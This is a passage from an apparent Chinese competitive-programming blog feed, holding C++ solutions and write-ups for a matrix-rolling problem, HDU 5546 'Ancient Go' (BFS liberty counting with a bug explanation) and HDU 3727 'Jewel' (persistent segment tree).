class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">201</span>;</div><div class="line"><span class="keyword">struct</span> Mnode &#123;</div><div class="line">    <span class="keyword">int</span> r,d;</div><div class="line">    Mnode() &#123;&#125;</div><div class="line">    Mnode(<span class="keyword">int</span> _r,<span class="keyword">int</span> _d):r(_r),d(_d) &#123;&#125;</div><div class="line">&#125; m[N*N];</div><div class="line"><span class="keyword">int</span> n,q,root;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> x*n+y;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rollr</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (d==<span class="number">0</span>) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">int</span> rt=root;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(l<span class="number">-1</span>+n)%n;i++)</div><div class="line">        rt=m[rt].d;</div><div class="line">    <span class="keyword">int</span> pl=m[rt].d;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)</div><div class="line">        pl=m[pl].r;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        m[rt].d=pl;</div><div class="line">        rt=m[rt].r;</div><div class="line">        pl=m[pl].r;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=l<span class="number">-1</span>;i&lt;r;i++)</div><div class="line">        rt=m[rt].d;</div><div class="line">    <span class="keyword">int</span> pr=m[rt].d;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n-d;i++)</div><div class="line">        pr=m[pr].r;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        m[rt].d=pr;</div><div class="line">        rt=m[rt].r;</div><div class="line">        pr=m[pr].r;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (l&lt;=<span class="number">0</span>&amp;&amp;<span class="number">0</span>&lt;=r)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)</div><div class="line">             root=m[root].r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rollc</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (d==<span class="number">0</span>) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">int</span> rt=root;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(l<span class="number">-1</span>+n)%n;i++)</div><div class="line">        rt=m[rt].r;</div><div class="line">    <span class="keyword">int</span> pl=m[rt].r;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)</div><div class="line">        pl=m[pl].d;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        m[rt].r=pl;</div><div class="line">        rt=m[rt].d;</div><div class="line">        pl=m[pl].d;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=l<span class="number">-1</span>;i&lt;r;i++)</div><div class="line">        rt=m[rt].r;</div><div class="line">    <span class="keyword">int</span> pr=m[rt].r;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n-d;i++)</div><div class="line">        pr=m[pr].d;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        m[rt].r=pr;</div><div class="line">        rt=m[rt].d;</div><div class="line">        pr=m[pr].d;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (l&lt;=<span class="number">0</span>&amp;&amp;<span class="number">0</span>&lt;=r)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)</div><div class="line">             root=m[root].d;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++) &#123;</div><div class="line">            <span class="keyword">if</span> (j&lt;n<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">"%d "</span>,root);</div><div class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,root);</div><div class="line">            root=m[root].r;</div><div class="line">        &#125;</div><div class="line">        root=m[root].d;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;q);</div><div class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++) &#123;</div><div class="line">            m[tot++]=Mnode(get(i,(j+<span class="number">1</span>)%n),get((i+<span class="number">1</span>)%n,j));</div><div class="line">        &#125;</div><div class="line">    root=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (q--) &#123;</div><div class="line">        <span class="keyword">int</span> k,l,r,d;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>,&amp;k,&amp;l,&amp;r,&amp;d);</div><div class="line">        <span class="keyword">if</span> (k==<span class="number">1</span>) rollr(l,r,d);</div><div class="line">        <span class="keyword">else</span> rollc(l,r,d);</div><div class="line"><span class="comment">//        printf("ROOT: %d\n",root);</span></div><div class="line"><span class="comment">//        print();</span></div><div class="line">    &#125;</div><div class="line">    print();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5546 Ancient Go 搜索</title>
      <url>/blog/2016/09/30/hdu5546/</url>
      <content type="html"><![CDATA[<h3 id="Ancient-Go"><a href="#Ancient-Go" class="headerlink" title="Ancient Go"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5546" target="_blank" rel="noopener">Ancient Go</a></h3><p>题意：给出棋盘，轮到 x 这一方下子，问能不能至少提掉一个 o 方的子。<br>题解：枚举每一个 o ，bfs 一下看看周围的 . 是不是少于等于 1 个，太简单辣！</p><p>考虑到要优化时间，枚举每一个 o 的时候直接把那一片 o 都标记了，这样就省了很多次 bfs 。<br>不得不说这真的是一道打击信心的题。。。。。。<br>虽然没有WA很多次，，，但是就是想不出来为什么WA。。。<br>实际上。。。数 . 的时候有些 . 会被数两次。。。比如：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.....xoox</div><div class="line">.......ox</div><div class="line">.......x.</div></pre></td></tr></table></figure></p><p>因为从我的思路来讲，标记一片 o 是为了让下次不再搜索，但是 . 在下次还是会用到的，所以肯定不会标记。这样的后果就是搜索到 . 时其实并不知道它在这一次有没有被搜到过。。。<br>正确的做法要给 . 加上标记，可以用时间戳标记，代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; PII;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">10</span>][<span class="number">10</span>];</div><div class="line"><span class="keyword">int</span> b[<span class="number">10</span>][<span class="number">10</span>];</div><div class="line"><span class="keyword">int</span> index;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="built_in">queue</span>&lt;PII&gt; Q;</div><div class="line">    Q.push(PII(x,y));</div><div class="line">    b[x][y]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (!Q.empty()) &#123;</div><div class="line">        <span class="keyword">int</span> x=Q.front().first;</div><div class="line">        <span class="keyword">int</span> y=Q.front().second;</div><div class="line">        Q.pop();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</div><div class="line">            <span class="keyword">int</span> xx=x+dx[i];</div><div class="line">            <span class="keyword">int</span> yy=y+dy[i];</div><div class="line">            <span class="keyword">if</span> (xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;=<span class="number">9</span>||yy&gt;=<span class="number">9</span>) <span class="keyword">continue</span>;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[xx][yy]==<span class="string">'.'</span>) &#123;</div><div class="line">                <span class="keyword">if</span> (b[xx][yy]!=index) &#123;</div><div class="line">                    ++res;</div><div class="line">                    b[xx][yy]=index;</div><div class="line">                &#125;</div><div class="line">                <span class="comment">/*********WA*********</span></div><div class="line">                ++res;</div><div class="line">                ********************/ </div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>[xx][yy]==<span class="string">'o'</span>&amp;&amp;!b[xx][yy]) &#123;</div><div class="line">                b[xx][yy]=<span class="number">1</span>;</div><div class="line">                Q.push(PII(xx,yy));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,t=<span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">WCON:</div><div class="line">    <span class="keyword">while</span> (++t&lt;=T) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,<span class="built_in">map</span>[i]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: "</span>,t);</div><div class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</div><div class="line">        index=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;j++) &#123;</div><div class="line">                <span class="keyword">if</span> (<span class="built_in">map</span>[i][j]==<span class="string">'o'</span>&amp;&amp;!b[i][j]) &#123;</div><div class="line">                    ++index;</div><div class="line">                    <span class="keyword">int</span> tmp=bfs(i,j);</div><div class="line">                    <span class="keyword">if</span> (tmp&lt;=<span class="number">1</span>) &#123;</div><div class="line">                        <span class="built_in">puts</span>(<span class="string">"Can kill in one move!!!"</span>);</div><div class="line">                        <span class="keyword">goto</span> WCON;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"Can not kill in one move!!!"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>而在我上网查题解的时候又看到了另一种想法</p><p><img src="http://img.blog.csdn.net/20160930204609070" alt="另一种想法"></p><p>这个想法就回避了数 . 的问题，当然我估计这个想法比较小众。。。因为大家觉得性能太差了。。。<br>所以说这题。。。出在现场赛还算是公平吧。。。<del>就是太打击信心了 :-( ！！</del></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 3727 Jewel 主席树</title>
      <url>/blog/2016/09/29/hdu3727/</url>
      <content type="html"><![CDATA[<p>最近在学主席树。。。反正感觉挺神奇的。。。<br>我高中想学，但是并没有看懂。<del>可能是他们写的太屎了</del><br>kuangbin的板子也不太行。<br>poj 2104 那题入门，程序是没错<br>但是太耦合了，变量也有点意义不明。。。<br>于是我又去找了找。。。发现应该给一个比利比利的链接</p><p><a href="http://www.bilibili.com/video/av4619406/" target="_blank" rel="noopener">qsc菊苣教你主席树啊</a><br>这个讲的不错啊  就是p2的时候码力实在太强。。。只能暂停学姿势<br>然后我又去找最佳实践，，，<br>但是感觉都有不舒服的地方。。。只能自己瞎编着上了<br>【知道最佳实践的一定要告诉我啊</p><h3 id="Jewel"><a href="#Jewel" class="headerlink" title="Jewel"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=3727" target="_blank" rel="noopener">Jewel</a></h3><p>题意：初始的链为空，需要支持以下四个操作：略。<br>题解：Query_1 和 Query_3 很明显就是静态第k小，又因为是权值线段树，Query_2 就是前缀和呗。。。<br>因为数太大啦，再套个离散化，要离散化首先要把操作离线。<del>ok，这样这题就AC啦</del><br>这题昨天晚上从开始读到调完正好一小时，而且中间也跟室友吹吹逼啥的<br>感觉自己码力很有进步啊！然后交上去WA了。。。<br>当然我其实知道一个WA点，，，answer 没改成 longlong<br>满怀信心，再交。。。又WA了。。。<br>刚刚又xjb交了一遍，还是WA<br>然后去查题解。。。发现我好像有什么地方理解错了。。。</p><blockquote><p>… and the amounts of “Query_1”, “Query_2” and “Query_3” are all less than 35000.</p></blockquote><p>三种询问的数量都不超过35000。。。我似乎理解成和了？？？？<br>。。。代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100001</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">35000</span>*<span class="number">3</span>+N;</div><div class="line"><span class="keyword">struct</span> chair &#123;</div><div class="line">    <span class="keyword">int</span> ls,rs,sum;</div><div class="line">&#125; T[M*<span class="number">40</span>];</div><div class="line"><span class="keyword">struct</span> oper &#123;</div><div class="line">    <span class="keyword">int</span> op,x,y,k;</div><div class="line">&#125; op[M];</div><div class="line"><span class="keyword">int</span> root[N],A[N];</div><div class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans[<span class="number">4</span>];</div><div class="line"></div><div class="line"><span class="keyword">int</span> index;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> newroot=++index;</div><div class="line">    T[newroot]=T[rt];</div><div class="line">    T[newroot].sum++;</div><div class="line">    <span class="keyword">if</span> (l==r) <span class="keyword">return</span> newroot;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (x&lt;=m) T[newroot].ls=update(T[newroot].ls,l,m,x);</div><div class="line">    <span class="keyword">else</span> T[newroot].rs=update(T[newroot].rs,m+<span class="number">1</span>,r,x);</div><div class="line">    <span class="keyword">return</span> newroot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> k)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l==r) <span class="keyword">return</span> l;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> lsz=T[T[y].ls].sum-T[T[x].ls].sum;</div><div class="line">    <span class="keyword">if</span> (lsz&gt;=k) &#123;</div><div class="line">        <span class="keyword">return</span> query(T[x].ls,T[y].ls,l,m,k);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> query(T[x].rs,T[y].rs,m+<span class="number">1</span>,r,k-lsz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrank</span><span class="params">(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) <span class="keyword">return</span> T[rt].sum;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) res+=getrank(T[rt].ls,l,m,L,R);</div><div class="line">    <span class="keyword">if</span> (m&lt;R) res+=getrank(T[rt].rs,m+<span class="number">1</span>,r,L,R);</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">case_init</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    index=root[<span class="number">0</span>]=<span class="number">0</span>;</div><div class="line">    T[<span class="number">0</span>].ls=T[<span class="number">0</span>].rs=T[<span class="number">0</span>].sum=<span class="number">0</span>;</div><div class="line">    <span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="keyword">sizeof</span>(ans));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> cas=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> q;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;q)!=EOF) &#123;</div><div class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</div><div class="line">        case_init();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=q;i++) &#123;</div><div class="line">            <span class="keyword">char</span> s[<span class="number">10</span>];</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</div><div class="line">            <span class="keyword">if</span> (s[<span class="number">0</span>]==<span class="string">'I'</span>) &#123;</div><div class="line">                op[i].op=<span class="number">0</span>;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;op[i].x);</div><div class="line">                A[++n]=op[i].x;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[<span class="number">6</span>]==<span class="string">'1'</span>) &#123;</div><div class="line">                op[i].op=<span class="number">1</span>;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;op[i].x,&amp;op[i].y,&amp;op[i].k);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[<span class="number">6</span>]==<span class="string">'2'</span>) &#123;</div><div class="line">                op[i].op=<span class="number">2</span>;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;op[i].x);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[<span class="number">6</span>]==<span class="string">'3'</span>) &#123;</div><div class="line">                op[i].op=<span class="number">3</span>;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;op[i].k);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        sort(A+<span class="number">1</span>,A+<span class="number">1</span>+n);</div><div class="line">        </div><div class="line">        <span class="keyword">int</span> tot=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=q;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (op[i].op==<span class="number">0</span>) &#123;</div><div class="line">                tot++;</div><div class="line">                root[tot]=update(root[tot<span class="number">-1</span>],<span class="number">1</span>,n,lower_bound(A+<span class="number">1</span>,A+<span class="number">1</span>+n,op[i].x)-A);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">long</span> <span class="keyword">long</span> tmp=<span class="number">0</span>;</div><div class="line">                <span class="keyword">if</span> (op[i].op==<span class="number">1</span>) </div><div class="line">                    tmp=A[query(root[op[i].x<span class="number">-1</span>],root[op[i].y],<span class="number">1</span>,n,op[i].k)];</div><div class="line">                <span class="keyword">if</span> (op[i].op==<span class="number">2</span>) </div><div class="line">                    tmp=getrank(root[tot],<span class="number">1</span>,n,<span class="number">1</span>,lower_bound(A+<span class="number">1</span>,A+<span class="number">1</span>+n,op[i].x)-A);</div><div class="line">                <span class="keyword">if</span> (op[i].op==<span class="number">3</span>) </div><div class="line">                    tmp=A[query(root[<span class="number">0</span>],root[tot],<span class="number">1</span>,n,op[i].k)];</div><div class="line">                ans[op[i].op]+=tmp;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d:\n"</span>,++cas);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans[i]);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
